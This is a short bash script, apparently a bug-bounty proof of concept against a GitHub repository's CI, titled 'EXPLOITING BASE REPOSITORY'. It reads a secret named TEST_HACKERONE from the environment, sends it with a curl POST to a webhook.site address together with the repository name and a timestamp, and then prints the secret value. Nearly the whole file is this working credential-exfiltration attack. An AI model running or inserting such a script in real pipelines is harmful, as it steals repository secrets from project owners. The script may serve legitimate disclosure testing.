#!/bin/bash

echo "================================"
echo "EXPLOITING BASE REPOSITORY"
echo "================================"

# Get the secret
HACKERONE_SECRET="${TEST_HACKERONE}"

# Get webhook URL
WEBHOOK="https://webhook.site/069b3073-d92e-4677-b186-be3499ade648"

echo "Repository: ${GITHUB_REPOSITORY}"
echo "Secret length: ${#HACKERONE_SECRET}"

# Exfiltrate to webhook
curl -X POST "$WEBHOOK" \
  -H "Content-Type: application/json" \
  -d "{
    \"exploit\": \"TEST_HACKERONE_captured\",
    \"repository\": \"${GITHUB_REPOSITORY}\",
    \"secret\": \"${HACKERONE_SECRET}\",
    \"timestamp\": \"$(date -u)\"
  }"

echo "✅ Secret exfiltrated!"
echo "Secret value: ${HACKERONE_SECRET}"
